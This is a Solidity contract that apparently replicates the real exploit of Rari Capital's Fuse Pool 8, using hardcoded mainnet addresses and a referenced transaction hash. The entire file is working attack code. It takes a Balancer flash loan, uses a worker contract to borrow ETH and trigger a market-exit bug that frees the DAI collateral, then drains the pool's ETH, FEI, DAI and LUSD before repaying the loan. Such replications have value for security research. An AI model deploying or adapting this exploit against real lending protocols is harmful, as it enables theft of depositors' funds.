// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./RariWorker.sol";

// Tx hash: 0x0f75349606610313cb666277eeda612e72be624cae061d017e503056bbf4d8e0
// Only replicating attack on Pool 8 done by attacker
contract RariExploiter {
    IVault private constant BALANCER_VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Like private constant FEI = IERC20Like(0x956F47F50A910163D8BF957Cf5846D573E7f87CA);
    IERC20Like private constant DAI = IERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20Like private constant LUSD = IERC20Like(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);

    // --- Pool 8 ---
    ICEther private constant FETH_8 = ICEther(0xbB025D470162CC5eA24daF7d4566064EE7f5F111);
    ICErc20 private constant FFEI_8 = ICErc20(0xd8553552f8868C1Ef160eEdf031cF0BCf9686945);
    ICErc20 private constant FDAI_8 = ICErc20(0x7e9cE3CAa9910cc048590801e64174957Ed41d43);
    ICErc20 private constant FLUSD_8 = ICErc20(0x647A36d421183a0a9Fa62717a64B664a24E469C7);
    IComptroller private constant COMPTROLLER = IComptroller(0xc54172e34046c1653d1920d40333Dd358c7a1aF4);

    uint256 private constant INITIAL_WETH_AMOUNT = 50_000e18; // 50k WETH
    uint256 private constant INITIAL_DAI_AMOUNT = 90_000_000e18; // 90m DAI

    function exploit() external {
        IERC20Like[] memory tokens = new IERC20Like[](2);
        tokens[0] = DAI;
        tokens[1] = WETH;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = INITIAL_DAI_AMOUNT;
        amounts[1] = INITIAL_WETH_AMOUNT;

        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, '');
    }

    function receiveFlashLoan(
        IERC20Like[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        // --- Drain ETH from pool
        // Enter fDAI market to use DAI as collateral and mint fDAI
        address fToken = COMPTROLLER.cTokensByUnderlying(address(DAI));
        RariWorker worker = new RariWorker(
            address(this), address(FETH_8), fToken, address(COMPTROLLER), INITIAL_DAI_AMOUNT);
        DAI.transfer(address(worker), INITIAL_DAI_AMOUNT);
        worker.enter();
        worker.mint();

        // Borrow all ETH in pool, trigger bug to exit fDai market, get back DAI collateral, keep ETH
        uint256 borrowAmount = FETH_8.getCash();
        worker.borrow(borrowAmount);
        worker.redeemAndTransfer();
        assert(DAI.balanceOf(address(this)) == INITIAL_DAI_AMOUNT);
        assert(address(this).balance == borrowAmount);
        assert(FETH_8.getCash() == 0);
        // ---

        // --- Drain FEI, DAI, LUSD from pool
        // Get some ETH
        WETH.withdraw(INITIAL_WETH_AMOUNT);

        // Enter fETH market and mint fETH. Pool gains back some ETH.
        address[] memory fTokens = new address[](1);
        fTokens[0] = address(FETH_8);
        COMPTROLLER.enterMarkets(fTokens);
        FETH_8.mint{value: INITIAL_WETH_AMOUNT}(INITIAL_WETH_AMOUNT);
        assert(FETH_8.getCash() == INITIAL_WETH_AMOUNT);

        // Borrow all FEI, DAI, LUSD in pool using ETH as collateral
        borrowAmount = FFEI_8.getCash();
        FFEI_8.borrow(borrowAmount);

        borrowAmount = FDAI_8.getCash();
        FDAI_8.borrow(borrowAmount);

        borrowAmount = FLUSD_8.getCash();
        FLUSD_8.borrow(borrowAmount);

        // Enter fDAI market to use DAI as collateral and mint fDAI
        fToken = COMPTROLLER.cTokensByUnderlying(address(DAI));
        worker = new RariWorker(address(this), address(FETH_8), fToken, address(COMPTROLLER), INITIAL_DAI_AMOUNT);
        DAI.transfer(address(worker), INITIAL_DAI_AMOUNT);
        worker.enter();
        worker.mint();

        // Borrow whatever ETH allowed by account liquidity, trigger bug again to exit fDAI market, 
        // get back DAI collateral, keep ETH
        (,uint256 liquidity,) = COMPTROLLER.getAccountLiquidity(address(worker));
        worker.borrow(liquidity);
        worker.redeemAndTransfer();

        // Redeem remaining ETH left, keep tokens
        borrowAmount = FETH_8.getCash();
        FETH_8.redeemUnderlying(borrowAmount);

        assert(FETH_8.getCash() == 0);
        assert(FDAI_8.getCash() == 0);
        assert(FFEI_8.getCash() == 0);
        assert(FLUSD_8.getCash() == 0);

        // Repay flash loan
        WETH.deposit{value: 50_000 ether}();
        DAI.transfer(address(BALANCER_VAULT), INITIAL_DAI_AMOUNT);
        WETH.transfer(address(BALANCER_VAULT), INITIAL_WETH_AMOUNT);
    }

    receive() external payable {}
}
